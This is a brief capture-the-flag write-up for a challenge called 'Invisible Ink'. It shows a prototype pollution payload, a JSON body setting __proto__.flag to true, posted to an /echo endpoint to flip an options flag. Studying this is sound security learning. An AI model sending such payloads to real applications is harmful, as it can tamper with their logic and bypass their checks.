# Invisible Ink Solution

## Proto Poisoning

sent the following in the data of the post request to /echo

```
{
    "__proto__": {
        "flag": true
    }
}
```

This changes the options.flags to true